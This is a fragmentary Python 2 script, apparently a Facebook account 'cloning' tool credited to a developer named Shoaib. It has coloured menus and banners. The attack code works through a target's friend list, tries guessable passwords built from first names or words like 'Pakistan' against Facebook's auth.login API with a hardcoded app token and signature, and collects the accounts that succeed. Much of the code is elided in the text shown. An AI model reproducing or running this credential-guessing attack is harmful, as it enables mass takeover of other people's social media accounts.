...
\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Shoaib Blouch            ║  
	...
	try:
		...
		if 'save-device' in url:
			...
			try:
				...
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Sucessful'
		...
		if 'checkpoint' in url:
			...
			print("\n\033[1;96m[!] \x1b[1;91mYour aacount is on checkpoint")
...
def super():
	...
	print "     \033[1;97m-•◈•-\03﻿3[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
...
def pilih_super():
	...
	if peak =="":
		...
		print "\033[1;97m•◈•══════•◈•\033[1;91mShoaib Aadam\033[1;97m•◈•══════•◈•"
		...
		print "\033[1;92m•◈•══════••◈•\033[1;91mRaza\033[1;95m•◈•══════••◈•"
	...
	jalan('           \033[1;91mShoaib start cloning Wait...')
						       ...
						       oks.append(user+pass3)
						           ...
						           pass4 = b['first_name'] + '1212'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   ...
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['n﻿ame']											
						                       ...
						                       if 'access_token' in q:	
							                           ...
							                           pass6 = 'Pakistan'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								                               ...
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%2257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										                                       ...
										                                       if 'access_token' in q:		
											                                       ...
											                                       oks.append(user+pass9)
				                                                                                                   ...
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['nam']
	...
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAadam\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;91m«---•◈•---Developed By Shoaib--•◈•---»" #Dev:Rana

	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 shoaib.py)↩\033[1;97m....'
...
: \033[1;91m ....Shoaib Ali....... \033[1;95m :
